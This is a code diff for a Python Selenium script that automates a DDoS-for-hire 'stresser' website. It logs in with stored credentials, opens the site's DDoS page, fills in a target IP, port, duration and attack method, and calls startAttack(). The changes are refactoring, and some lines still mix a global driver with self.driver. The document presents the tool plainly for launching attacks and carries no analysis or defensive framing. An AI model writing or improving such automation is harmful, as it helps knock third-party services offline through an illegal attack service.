@@ -66,19 +66,22 @@ class Pages:
 
 class Main(Pages):
     def __init__(self, driver: webdriver.Chrome) -> None:
-        driver.get("https://www.stressthem.se")
-        driver.implicitly_wait(0.5)
+        self.driver = driver
+        self.driver.get("https://www.stressthem.se")
+        self.driver.implicitly_wait(0.5)
 
-
+    def find_element_by_locator(self, locator):
+        return WebDriverWait(self.driver, 10).until(EC.presence_of_element_located(locator))
 
     def login_form(self) -> any:
         self.login_page()
 
-        print(driver.page_source)
-        username_form = driver.find_element(By.ID, "username")
+        username_form = self.driver.find_element(By.ID, "username")
         username_form.send_keys(username)
-        password_form = driver.find_element(By.ID, "password")
+
+        password_form = self.driver.find_element(By.ID, "password")
         password_form.send_keys(password)
+
         driver.implicitly_wait(0.5)
         driver.find_element(By.CLASS_NAME, "btn").click()
 
@@ -89,23 +92,22 @@ class Main(Pages):
     def start_attack(self, ip: str, port: int, time: int, method: str):
         self.DDoS_page()
 
-        self.button_telegram = driver.find_element(By.CLASS_NAME, "close")
-        
-        self.ip_form = driver.find_element(By.ID, "host")
-        self.port_form = driver.find_element(By.ID, "port")
-        self.time_form = driver.find_element(By.ID, "time")
-        self.method_form = Select(driver.find_element(By.ID, "method"))
-        self.button_form = driver.find_element(By.CLASS_NAME, "btn")
-
-
+        self.button_telegram = self.driver.find_element(By.CLASS_NAME, "close")
         self.button_telegram.click()
-        self.DDoS_page()
-        self.ip_form.send_keys(ip)
-        self.port_form.send_keys(port)
-        self.time_form.send_keys(time)
-        self.method_form.select_by_value(method)
-        self.button_form.click()
 
+        self.ip_form = self.driver.find_element(By.ID, "host")
+        self.ip_form.send_keys(ip)
+
+        self.port_form = self.driver.find_element(By.ID, "port")
+        self.port_form.send_keys(port)
+
+        self.time_form = self.driver.find_element(By.ID, "time")
+        self.time_form.send_keys(time)
+
+        self.method_form = Select(driver.find_element(By.ID, "method"))
+        self.method_form.select_by_value(method)
+        self.driver.implicitly_wait(1.0)
+        driver.execute_script("startAttack();")
 
     def driver_quit(self) -> any:
         driver.quit()
